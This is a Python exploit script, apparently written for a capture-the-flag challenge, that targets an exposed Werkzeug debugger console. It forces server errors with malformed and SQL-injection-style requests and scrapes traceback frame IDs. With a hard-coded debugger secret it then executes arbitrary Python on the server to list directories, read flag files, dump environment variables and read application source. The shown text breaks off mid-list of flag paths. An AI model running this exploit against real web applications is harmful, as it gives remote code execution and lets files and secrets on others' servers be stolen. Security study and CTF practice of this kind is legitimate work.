SECRET = "YKhX0CLt5PHAxuDtcFOy"

headers = {
    "User-Agent": "Mozilla/5.0 (Security Research)",
    "Cookie": f"session={SESSION_COOKIE}",
    "Accept": "application/json, text/plain, */*",
    "X-Requested-With": "XMLHttpRequest"
}

def trigger_traceback():
    """Trigger an actual application error to get a traceback frame"""
    print("[*] Triggering application error for traceback...")
    
    # Methods to trigger errors:
    # 1. POST to login without required fields
    error_methods = [
        {"url": f"{BASE_URL}/login", "method": "POST", "data": {}},
        {"url": f"{BASE_URL}/transactions", "method": "POST", "data": {"invalid": "data"}},
        {"url": f"{BASE_URL}/transactions", "method": "GET", "params": {"id": "'"}},  # SQL injection attempt
        {"url": f"{BASE_URL}/console", "method": "POST", "data": {"malformed": "data"}},
    ]
    
    for attempt in error_methods:
        try:
            print(f"\nTrying: {attempt['method']} {attempt['url']}")
            if attempt['method'] == 'POST':
                resp = requests.post(attempt['url'], headers=headers, data=attempt['data'], allow_redirects=False)
            else:
                resp = requests.get(attempt['url'], headers=headers, params=attempt['params'], allow_redirects=False)
            
            print(f"Status: {resp.status_code}")
            
            if resp.status_code == 500:
                print("[+] Got 500 error - checking for debugger...")
                
                # Check if debugger is active
                debug_match = re.search(r'__debugger__[=&a-zA-Z0-9_\-]*', resp.text)
                if debug_match:
                    debug_ref = debug_match.group(0)
                    print(f"[+] Debugger reference found: {debug_ref}")
                    
                    # Try to extract traceback frame
                    tb_match = re.search(r'frm=([0-9]+)', resp.text)
                    if tb_match:
                        frame = tb_match.group(1)
                        print(f"[+] Traceback frame found: {frame}")
                        return frame
                    
                    # Look for console link
                    console_match = re.search(r'/console[^\"\'\s]*', resp.text)
                    if console_match:
                        console_url = console_match.group(0)
                        print(f"[+] Console URL: {console_url}")
                        
                        # Try to access console
                        console_resp = requests.get(f"{BASE_URL}{console_url}", headers=headers)
                        if console_resp.status_code == 200:
                            # Look for frame in console
                            frame_match = re.search(r'frm=([0-9]+)', console_resp.text)
                            if frame_match:
                                frame = frame_match.group(1)
                                print(f"[+] Frame from console: {frame}")
                                return frame
        
        except Exception as e:
            print(f"Error: {e}")
            continue
    
    return None

def try_execute_with_frame(frame, code):
    """Try to execute code with a specific traceback frame"""
    print(f"[*] Attempting code execution with frame {frame}...")
    
    # Werkzeug debugger execute endpoint format
    execute_url = f"{BASE_URL}/console"
    params = {
        "__debugger__": "yes",
        "cmd": "execute",
        "frm": frame,
        "s": SECRET,
        "code": code
    }
    
    try:
        print(f"Executing: {code}")
        resp = requests.get(execute_url, headers=headers, params=params, timeout=15)
        print(f"Execute status: {resp.status_code}")
        print(f"Response: {resp.text[:500]}")
        
        if resp.status_code == 200:
            # Check if output contains our expected result
            if code.startswith("print(") and any(str(i) in resp.text for i in range(100)):
                print("[+] Code execution successful!")
                return True
            elif "Traceback" not in resp.text and "Error" not in resp.text[:100]:
                print("[+] Code likely executed (no error)")
                return True
        
        return False
        
    except Exception as e:
        print(f"Error executing code: {e}")
        return False

def test_console_execution():
    """Test various console execution methods"""
    print("\n[*] Testing console execution methods...")
    
    # Try to get a frame first
    frame = trigger_traceback()
    
    if not frame:
        # Try common frame IDs
        frame = "0"
        print(f"[-] Could not extract frame, trying default: {frame}")
    
    # Test commands
    test_commands = [
        "print('hello')",
        "import os; print(os.getcwd())", 
        "import sys; print(sys.version)",
        "print([f for f in __import__('os').listdir('.')])",
        "print(len(__import__('os').listdir('.')))"
    ]
    
    for cmd in test_commands:
        if try_execute_with_frame(frame, cmd):
            print(f"[+] Success with: {cmd}")
            return frame, cmd
        else:
            print(f"[-] Failed: {cmd}")
    
    return None, None

def search_for_flag(frame):
    """Search for flag file using the debugger console"""
    print("\n[*] Searching for flag files...")
    
    search_commands = [
        # List current directory
        "import os; print('CWD:', os.getcwd()); print('FILES:', os.listdir('.'))",
        
        # Search for flag in current dir
        "import os; [print(f'FLAG FILE:', f) for f in os.listdir('.') if 'flag' in f.lower() and os.path.isfile(f)]",
        
        # Try to read flag.txt
        "import os; print(open('flag.txt').read()) if os.path.exists('flag.txt') else print('No flag.txt')",
        
        # Try to read FLAG.txt
        "import os; print(open('FLAG.txt').read()) if os.path.exists('FLAG.txt') else print('No FLAG.txt')",
        
        # Search in parent directory
        "import os; [print(f'PARENT FILE:', f) for f in os.listdir('..') if 'flag' in f.lower() and os.path.isfile(os.path.join('..', f))]",
        
        # Look at environment vars
        "import os; print([v for k, v in os.environ.items() if 'flag' in k.lower()])",
        
        # Check Python modules
        "import sys; print([m for m in sys.modules if 'flag' in m.lower()])",
        
        # Try reading app files
        "import os; py_files = [f for f in os.listdir('.') if f.endswith('.py')]; [print(open(f).read()[:200]) for f in py_files if os.path.getsize(f) < 10000]"
    ]
    
    for cmd in search_commands:
        if try_execute_with_frame(frame, cmd):
            print(f"[+] Command executed: {cmd}")
            return True
    
    return False

def brute_force_flag_file(frame):
    """Try common flag file paths"""
    print("\n[*] Trying common flag file paths...")
    
    common_paths = [
        "flag.txt", "FLAG.txt", "/flag.txt", "../flag.txt", "../../flag.txt",
        "flag", "FLAG", "config/flag.txt", "app/flag.txt", 
